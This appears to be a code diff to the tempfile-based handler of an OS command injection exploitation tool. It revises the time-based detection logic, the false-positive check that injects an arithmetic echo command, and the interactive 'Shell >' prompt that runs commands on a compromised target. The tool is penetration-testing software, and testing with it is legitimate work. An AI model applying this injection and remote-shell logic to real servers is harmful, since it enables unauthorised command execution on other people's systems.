@@ -34,12 +34,12 @@ from src.core.injections.controller import checks
 from src.core.requests import headers
 from src.core.requests import parameters
 
-from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_injector
-from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_payloads
-from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_enumeration
-from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_file_access
+from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector
+from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads
+from src.core.injections.semiblind.techniques.tempfile_based import tfb_enumeration
+from src.core.injections.semiblind.techniques.tempfile_based import tfb_file_access
 
-from src.core.injections.semiblind_based.techniques.file_based import fb_injector
+from src.core.injections.semiblind.techniques.file_based import fb_injector
 
 """
  The "tempfile-based" injection technique on Semiblind OS Command Injection.
@@ -64,9 +64,10 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
   vp_flag = True
   no_result = True
   is_encoded = False
+  is_vulnerable = False
   export_injection_info = False
-  
-  injection_type = "Semiblind-based Command Injection"
+  how_long = 0
+  injection_type = "Semiblind Command Injection"
   technique = "tempfile-based injection technique"
   
   # Check if defined "--maxlen" option.
@@ -100,6 +101,9 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
         
         for output_length in range(1, int(tag_length)):
           try:
+
+            # Log previous 'how_long' for later comparison
+            previous_how_long = how_long
 
             # Tempfile-based decision payload (check if host is vulnerable).
             if alter_shell :
@@ -151,19 +155,22 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
               else:
                 percent = ""
             else:
-              if (url_time_response <= 1 and how_long >= delay) or \
-              (url_time_response >= 2 and how_long > delay):
-
+              if how_long == previous_how_long + delay:
                 # Time relative false positive fixation.
                 if len(TAG) == output_length:
+                  tmp_how_long = how_long
                   randv1 = random.randrange(0, 1)
                   randv2 = random.randrange(1, 2)
                   randvcalc = randv1 + randv2
                   cmd = "echo $((" + str(randv1) + "+" + str(randv2) + "))"
                   # Check for false positive resutls
-                  output = tfb_injector.false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell)
+                  how_long, output = tfb_injector.false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell, how_long)
                 
-                if str(output) == str(randvcalc) and len(TAG) == output_length:
+                if str(tmp_how_long) == str(how_long) and \
+                   str(output) == str(randvcalc) and \
+                   len(TAG) == output_length:
+                   
+                  is_vulnerable = True
                   if not menu.options.verbose:
                     percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
                   else:
@@ -210,13 +217,12 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
           
           # Yaw, got shellz! 
           # Do some magic tricks!
-          if (url_time_response <= 1 and how_long >= delay) or \
-          (url_time_response >= 2 and how_long > delay) :
-
-            if len(TAG) == output_length:
+          if how_long == previous_how_long + delay:
+            if (len(TAG) == output_length) and (is_vulnerable == True):
               found = True
               no_result = False
-              
+              is_vulnerable = False
+
               if settings.COOKIE_INJECTION == True: 
                 header_name = " Cookie"
                 found_vuln_parameter = vuln_parameter
@@ -325,6 +331,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                     while True:
                       try:
                         cmd = raw_input("Shell > ")
+                        cmd = checks.escaped_cmd(cmd)
                         if cmd.lower() in settings.SHELL_OPTIONS:
                           if cmd == "?":
                             menu.shell_options()
@@ -335,7 +342,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                             sys.exit(0)
                           elif cmd.lower() == "back":
                             go_back = True
-                            if checks.check_next_attack_vector(technique, go_back) == True:
+                            if checks.next_attack_vector(technique, go_back) == True:
                               break
                             else:
                               if no_result == True:
@@ -355,7 +362,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                         delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                         raise
                   elif gotshell in settings.CHOISE_NO:
-                    if checks.check_next_attack_vector(technique, go_back) == True:
+                    if checks.next_attack_vector(technique, go_back) == True:
                       break
                     else:
                       if no_result == True:
